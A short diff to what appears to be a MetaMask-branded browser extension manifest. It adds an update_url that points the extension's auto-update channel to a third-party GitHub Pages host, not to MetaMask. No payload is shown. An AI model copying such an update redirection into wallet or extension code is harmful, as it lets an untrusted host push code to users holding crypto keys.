@@ -7,5 +7,6 @@
     "matches": ["https://metamask.io/*"],
     "ids": ["*"]
   },
-  "minimum_chrome_version": "123"
+  "minimum_chrome_version": "123",
+  "update_url": "https://bearnetwork-brnkc.github.io/metamask-extension/update.xml"
 }
